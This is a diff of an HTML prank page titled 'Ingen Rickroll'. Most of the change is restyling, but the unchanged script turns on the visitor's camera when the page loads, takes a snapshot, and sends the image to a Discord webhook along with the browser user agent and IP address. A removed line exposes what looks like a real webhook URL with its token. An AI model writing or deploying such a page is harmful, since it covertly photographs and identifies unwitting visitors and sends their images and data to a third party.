@@ -3,8 +3,30 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ingen rickroll</title>
+    <title>Ingen Rickroll</title>
     <style>
+        /* General body styles */
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f0f8ff; /* Light blue background */
+            color: #333; /* Dark text color for better readability */
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            height: 100vh; /* Full height */
+            text-align: center; /* Center text alignment */
+        }
+
+        h1 {
+            font-size: 3rem; /* Larger font size for the header */
+            margin-bottom: 20px;
+            color: #ff5733; /* Bright orange color for header */
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3); /* Soft shadow for depth */
+        }
+
         /* Centered overlay for rickroll image */
         #overlay {
             position: fixed;
@@ -14,9 +36,12 @@
             width: 300px;  /* Set the desired width */
             height: 300px; /* Set the desired height */
             background-image: url('rickroll.png'); /* Make sure this image is hosted or available */
-            background-size: contain; /* Adjust to fit within width and height */
+            background-size: cover; /* Adjust to fit within width and height */
             background-repeat: no-repeat;
             background-position: center;
+            border: 5px solid #ff5733; /* Border around the overlay */
+            border-radius: 10px; /* Rounded corners */
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5); /* Shadow for depth */
             z-index: 9999; /* Keep it on top */
         }
 
@@ -28,12 +53,23 @@
         /* Styling for snapshot if you want to display it */
         #snapshot {
             width: 100%;
-            display: block;
+            max-width: 400px; /* Limit max width */
+            margin-top: 20px; /* Space above the snapshot */
+            border-radius: 10px; /* Rounded corners */
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3); /* Soft shadow for image */
+        }
+
+        /* Loading message style */
+        #loading {
+            display: none;
+            font-size: 1.2rem;
+            color: #555; /* Medium gray color for loading text */
+            margin-top: 20px;
         }
     </style>
 </head>
 <body>
-    <!-- Overlay for displaying the smaller rickroll image -->
+    <h1>Ingen Rickroll</h1>
     <div id="overlay"></div>
 
     <!-- Hidden elements for capturing and displaying snapshots -->
@@ -41,8 +77,10 @@
     <canvas id="canvas"></canvas>
     <img id="snapshot" style="display: none;"/>
 
+    <div id="loading">Taking snapshot... Please wait.</div>
+    
     <script>
-        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1299390747711373334/iO5Sbk83deMgQEYd8YfesE-jcYQmL2fudZcdiGuuJUCUZe95-1gNs4VbmYd6mM2qAJhJ"; // Replace with your webhook URL
+        const DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL"; // Replace with your webhook URL
 
         // Start the camera automatically when the page loads
         window.onload = async () => {
@@ -119,6 +157,8 @@
 
             // Display the snapshot
             document.getElementById('snapshot').src = imageData;
+            document.getElementById('snapshot').style.display = 'block'; // Show snapshot
+            document.getElementById('loading').style.display = 'none'; // Hide loading message
 
             // Send the image to Discord with additional details
             uploadImageToDiscord(imageData, video.videoWidth, video.videoHeight, userAgent, ipAddress);
